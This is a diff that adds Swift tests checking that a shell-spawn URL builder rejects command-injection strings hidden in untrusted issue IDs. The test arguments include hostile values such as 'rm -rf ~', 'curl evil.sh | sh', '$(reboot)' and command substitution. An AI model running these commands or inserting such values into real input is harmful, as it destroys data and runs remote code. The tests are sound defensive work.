@@ -250,6 +250,64 @@ struct HolyMannaInboxBoardTests {
     }
 }
 
+/// The spawn URL's `initialInput` is piped to the child shell's stdin and
+/// RUNS. Issue ids arrive from `.manna/issues.jsonl` files in discovered
+/// repos — untrusted data when a board lives in a cloned third-party repo.
+/// Only ids in manna's own alphabet may ever reach that surface.
+struct HolyMannaSpawnURLInjectionTests {
+    @Test func wellFormedIDBuildsTheShowURL() throws {
+        let url = try #require(HolyMannaInboxSectioner.spawnURL(
+            boardRoot: "/Users/erik/Custom-Coding/holy-ghostty",
+            issueID: "mn-cb681f"
+        ))
+        let query = try #require(URLComponents(url: url, resolvingAgainstBaseURL: false)?.queryItems)
+        #expect(query.first { $0.name == "initialInput" }?.value == "agent-do manna show mn-cb681f")
+    }
+
+    @Test(arguments: [
+        "mn-x; rm -rf ~",
+        "mn-cb681f; curl evil.sh | sh",
+        "mn-cb681f\nrm -rf ~",
+        "mn-$(whoami)",
+        "mn-`id`",
+        "mn-cb681f && echo pwned",
+        "$(reboot)",
+        "mn-CB681F",
+        "mn-",
+        "",
+        "cb681f",
+        "mn-cb681f-extra-long-tail-beyond-any-real-id",
+    ])
+    func hostileOrMalformedIDNeverReachesExecutedStdin(_ id: String) {
+        #expect(HolyMannaInboxSectioner.spawnURL(
+            boardRoot: "/Users/erik/Custom-Coding/holy-ghostty",
+            issueID: id
+        ) == nil)
+    }
+
+    @Test func rowWithHostileIDDegradesToNoActionNotNoRow() {
+        let issue = HolyMannaIssueSummary(
+            id: "mn-x; rm -rf ~",
+            title: "hostile board row",
+            status: .open,
+            claimedBy: nil,
+            type: .dream,
+            track: nil,
+            updated: "2026-08-03 (today)",
+            gate: nil
+        )
+        let sections = HolyMannaInboxSectioner.sections(
+            boards: [HolyMannaBoardReading(
+                root: "/tmp/hostile-board",
+                issues: [issue]
+            )]
+        )
+        let row = sections.flatMap(\.rows).first { $0.title == "hostile board row" }
+        #expect(row != nil)
+        #expect(row?.action == HolyInboxRowAction.none)
+    }
+}
+
 /// A board whose contents change between refresh ticks.
 final class HolyMannaMutableBoard: @unchecked Sendable {
     private let lock = NSLock()
